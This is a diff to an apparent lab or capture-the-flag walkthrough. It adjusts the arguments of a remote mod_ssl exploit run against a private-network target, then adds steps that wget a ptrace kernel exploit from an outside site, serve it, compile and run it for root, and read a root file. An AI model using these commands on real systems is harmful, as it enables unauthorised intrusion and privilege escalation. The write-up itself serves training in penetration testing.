@@ -63,6 +63,19 @@ searchsploit -m 47080
 ```
 mv 47080.c OpenFuck.c
 gcc -o OpenFuck OpenFuck.c -lcrypto
-./OpenFuck 0x6b 192.168.1.104
+./OpenFuck 0x6b 192.168.1.104 443 -c 40
 ```
 ![7](https://user-images.githubusercontent.com/75953873/177683272-6f97282a-31d1-46be-94c9-3020f0e959be.png)
+
+```
+wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+mv ptrace-kmod.c ptrace.c
+python3 -m http.server 80
+cd /tmp
+gcc -o exploit ptrace.c
+chmod +x exploit
+./exploit
+cd /root
+cat anaconda-ks.cfg
+```
+![9](https://user-images.githubusercontent.com/75953873/177688261-c2596953-e1ff-47d5-a64e-0f67619cad50.png)
